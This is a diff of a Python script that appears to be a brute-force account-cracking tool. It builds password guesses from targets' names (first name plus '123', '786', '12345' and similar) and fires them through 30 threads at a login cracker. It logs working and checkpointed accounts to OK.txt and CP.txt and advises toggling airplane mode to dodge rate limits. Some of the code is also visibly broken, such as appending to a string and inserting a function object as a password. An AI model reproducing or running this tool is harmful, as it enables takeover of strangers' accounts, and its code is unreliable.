@@ -203,86 +203,107 @@ def setting():
 			xx = random.randint(0,len(id2))
 			id2.insert(xx,bacot)
 	else:
-			print(f"{B} \ \33[0;96m[✓] Crack password manual/default {P}M/D")
-			ter =input(f"{P}\   Choose : {P}")
-			if ter in ["m","M"]:
-				print(f"{B}   \{M} Only Support M-Pass !!");exit()
-				exit()
-			elif ter in ["d","D"]:
-				with ThreadPoolExecutor(max_workers=30) as coeg:
-					started()
-					for user in id:
-						uid, name = user.split("|")
-						frist=name.split(" ")
-						if len(frist)>=6:
-							fii = [ name ]
-						elif len(frist)<=2:
-							fii = [ name ]
-						elif len(frist)<=3:
-							fii = [ name ]
-						else:
-							fii = [ name ]
-
-						coeg.submit(apiiii, uid, fii)
-				exit()
-
-if mrbaloch in ["3","03"]:
-		print(f"{B} \ \33[0;96m[✓] Apply Cp Detector {P}Y/t")
-		_start_=input(f"{P}\   Choose : {P}")
-		if _start_ in ["t","T"]:
-			print(f"{B}   \{M} Ok Godby !!");exit()
-
-		else:
-			print(f"{B} \ \33[0;96m[✓] Crack password manual/default {P}M/D")
-			ter =input(f"{P}\   Choose : {P}")
-			if ter in ["m","M"]:
-				print(f"{B}   \{M} Only Support M-Pass !!");exit()
-				exit()
-			elif ter in ["d","D"]:
-				with ThreadPoolExecutor(max_workers=30) as coeg:
-					started()
-					for user in id:
-						uid, name = user.split("|")
-						frist=name.split(" ")
-						if len(frist)>=6:
-							fii = [ name, frist[0]+"786", frist[0]+"123", frist[0]+"1234", frist[0]+"12345", "khankhan", "786786" ]
-						elif len(frist)<=2:
-							fii = [ name, frist[0]+"786", frist[0]+"123", frist[0]+"1234", frist[0]+"12345", "khankhan", "786786" ]
-						elif len(frist)<=3:
-							fii = [ name, frist[0]+"786", frist[0]+"123", frist[0]+"1234", frist[0]+"12345", "khankhan", "786786" ]
-						else:
-							fii = [ name, frist[0]+"786", frist[0]+"123", frist[0]+"1234", frist[0]+"12345", "khankhan", "786786" ]
-						coeg.submit(apiiii, uid, fii)
-				exit()
-				
-elif  mrbaloch in ["2","02"]:
-		print(f"{B} \ \33[0;96m[✓] Apply Cp Detector {P}Y/t")
-		_start_=input(f"{P}\   Choose : {P}")
-		if _start_ in ["t","T"]:
-			print(f"{B}   \{M} Ok Godby !!");exit()
-
-		else:
-			print(f"{B} \ \33[0;96m[✓] Crack password manual/default {P}M/D")
-			ter =input(f"{P}\   Choose : {P}")
-			if ter in ["m","M"]:
-				print(f"{B}   \{M} Only Support M-Pass !!");exit()
-				exit()
-			elif ter in ["d","D"]:
-				with ThreadPoolExecutor(max_workers=30) as coeg:
-					started()
-					for user in id:
-						uid, name = user.split("|")
-						frist=name.split(" ")
-						if len(frist)>=6:
-							fii = [ name, frist[0]+"786", frist[0]+"123", frist[0]+"1234", frist[0]+"12345" ]
-						elif len(frist)<=2:
-							fii = [ name, frist[0]+"786", frist[0]+"123", frist[0]+"1234", frist[0]+"12345" ]
-						elif len(frist)<=3:
-							fii = [ name, frist[0]+"786", frist[0]+"123", frist[0]+"1234", frist[0]+"12345" ]
-						else:
-							fii = [ name, frist[0]+"786", frist[0]+"123", frist[0]+"1234", frist[0]+"12345" ]
-						coeg.submit(apiiii, uid, fii)
-				exit()
+		print (' [!] Choose Correct Option')
+		exit()
+	clear()
+	print(logo);print ('\n [01] Method 1 ');print (' [02] Method 2  \033[1;97m')
+	hc = input ("\n [+] Method : ")
+	if hc in ['1','01']:
+		method.append('mobile')
+	elif hc in ['2','02']:
+		method.append('free')
+	else:
+		method.append('mobile')
+	passmenu()
+def passmenu():
+	clear()
+	print(logo);print  ('\n [01] First name digit pass \n [02] All Name Password \n [03] FULL NAME PASS')
+	passmen=input('\n [#] Select Pass : ')
+	if passmen in ['1','01']:
+		first()
+	elif passmen in ['2','02']:
+		name()
+	elif passmen in ['3','03']:
+		name2()
+	else:
+		passmenu()
+		
+def first():
+	clear()
+	print(logo);print( '\n\033[1;94m [!] BRUTE  HAS BEEN START \n\033[1;96m [!] Turn Airplane Mode On/Off Every 5 Minutes\033[1;0m\n')
+	with tred(max_workers=30) as pool:
+		for yuzong in id2:
+			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
+			frs = nmf.split(' ')[0]
+			pwv = ['445566']
+			if len(nmf)<6:
+				if len(frs)<3:
+					pass
+				else:
+					pwv.append(frs+'123')
+					pwv.append(frs+'12345')
+			else:
+				if len(frs)<3:
+					pwv.append(nmf)
+				else:
+					pwv.append(nmf)
+					pwv.append(frs+'123')
+					pwv.append(frs+'12345')
+			if 'mobile' in method:
+				pool.submit(crack,idf,pwv)
+			elif 'free' in method:
+				pool.submit(free,idf,pwv)
+			else:
+				pool.submit(crack,idf,pwv)
+def name():
+	clear()
+	print(logo);print( '\n [!] OK Result Saved To : \033[1;92mOK.txt/%s\033[1;97m\n [!] CP Result Saved To : \033[1;91mCP.txt/%s\033[1;97m\n [!] \033[1;96mTurn Airplane Mode On/Off Every 5 Minutes\033[1;0m\n'%(okc,cpc))
+	with tred(max_workers=30) as pool:
+		for yuzong in id2:
+			try:
+				idf,nmf = yuzong.split('|')
+				xz = nmf.split(' ')
+				if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
+					pwv = [name, xz[0]+xz[0],xz[0]+xz[1]+"12345", xz[0]+xz[1]+"786",xz[0]+xz[1]+"123",xz[0]+xz[1]+"1234"]
+				else:
+					pwv = [name, xz[0]+xz[0],xz[0]+xz[1]+"12345", xz[0]+xz[1]+"786",xz[0]+xz[1]+"123",xz[0]+xz[1]+"1234"]
+				if 'mobile' in method:
+					pool.submit(crack,idf,pwv)
+				elif 'free' in method:
+					pool.submit(free,idf,pwv)
+				else:
+					pool.submit(crack,idf,pwv)
+			except:
+				pass
+def name2():
+	clear()
+	print(logo);print( '\n- - - - - - - - - - - - - - - - - - - - - - - - - - -\n [!] OK Result Saved To : \033[1;92mOK.txt/%s\033[1;97m\n [!] CP Result Saved To : \033[1;91mCP.txt/%s\033[1;97m\n- - - - - - - - - - - - - - - - - - - - - - - - - - -\n [!] \033[1;96m~Use Flight Mode 5 Second After Every 10 mint~\033[1;0m\n- - - - - - - - - - - - - - - - - - - - - - - - - - -\n'%(okc,cpc))
+	with tred(max_workers=30) as pool:
+		for yuzong in id2:
+			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
+			frs = nmf.split(' ')[0]
+			pwv = (nmf)
+			if len(nmf)<6:
+				if len(frs)<3:
+					pass
+				else:
+					pwv.append(frs+'123')
+					pwv.append(frs+'12345')
+			else:
+				if len(frs)<3:
+					pwv.append(nmf)
+				else:
+					pwv.append(nmf)
+					pwv.append(frs+'123')
+					pwv.append(frs+'12345')
+					pwv.append(frs+'1234')
+					pwv.append(frs+'786')
+			if 'mobile' in method:
+				pool.submit(crack,idf,pwv)
+			elif 'free' in method:
+				pool.submit(free,idf,pwv)
+			else:
+				pool.submit(crack,idf,pwv)
 	
 # CRACKER
 def crack(idf,pwv):
